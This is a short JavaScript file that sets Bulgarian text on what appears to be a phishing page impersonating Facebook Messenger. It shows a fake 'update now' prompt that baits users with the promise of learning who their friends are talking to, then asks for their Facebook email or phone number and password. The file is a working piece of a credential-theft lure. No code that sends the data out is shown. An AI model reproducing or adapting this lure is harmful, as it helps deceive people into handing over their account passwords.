var mainParagraph = document.querySelector(".con-text");
var subMainParagraph = document.querySelector(".log-text");
var updateButton = document.querySelector(".update")
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".login"); 
var checkBox = document.querySelector(".chbox"); 

mainParagraph.innerHTML ="Актуализирайте Messenger до най-новата версия, за да се насладите на новите функции, като например да знаете кой говори с приятелите ви";
subMainParagraph.innerHTML ="Незабавно се свържете с хората в живота си. Влезте с Facebook, за да започнете.";
updateButton.innerHTML ="актуализирайте сега";
userInput.setAttribute("placeholder" , "Имейл адрес или телефонен номер");
passInput.setAttribute("placeholder" , "парола");
logButton.setAttribute("value" , "Влизам");
checkBox.innerHTML ="Запомни ме";
